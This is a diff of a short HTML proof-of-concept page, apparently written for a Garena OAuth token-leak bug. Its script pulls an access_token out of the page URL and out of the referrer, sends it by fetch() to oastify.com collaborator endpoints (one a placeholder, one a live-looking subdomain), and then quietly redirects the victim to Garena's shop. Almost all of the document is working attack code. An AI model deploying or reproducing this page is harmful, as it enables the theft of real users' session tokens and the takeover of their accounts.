@@ -2,22 +2,27 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Garena Token Leak POC</title>
+  <title>Garena Token Leak</title>
 </head>
 <body>
-  <h2>Loading...</h2>
+  <h3>Redirecting...</h3>
 
   <script>
-    // Read referrer and try to extract access_token
+    // 1. Try to steal from full URL
+    const href = window.location.href;
+    if (href.includes("access_token=")) {
+      const token = href.split("access_token=")[1].split(/[&#]/)[0];
+      fetch("https://YOUR.oastify.com/leak?source=href&token=" + encodeURIComponent(token));
+    }
+
+    // 2. Try to steal from referrer
     const ref = document.referrer;
     if (ref.includes("access_token=")) {
       const token = ref.split("access_token=")[1].split(/[&#]/)[0];
-
-      // Leak to attacker-controlled endpoint
-      fetch("https://q2tjnk8qcrqlhk0poo6mxiktikocc30s.oastify.com/leak?token=" + encodeURIComponent(token));
+      fetch("https://q2tjnk8qcrqlhk0poo6mxiktikocc30s.oastify.com/leak?source=referrer&token=" + encodeURIComponent(token));
     }
 
-    // Optional: Redirect victim back to a normal page after few seconds
+    // Optional: redirect back to Garena after 2s
     setTimeout(() => {
       window.location.href = "https://shop.garena.sg/?utm_source=FF+RedeemPage&utm_medium=Entrance";
     }, 2000);
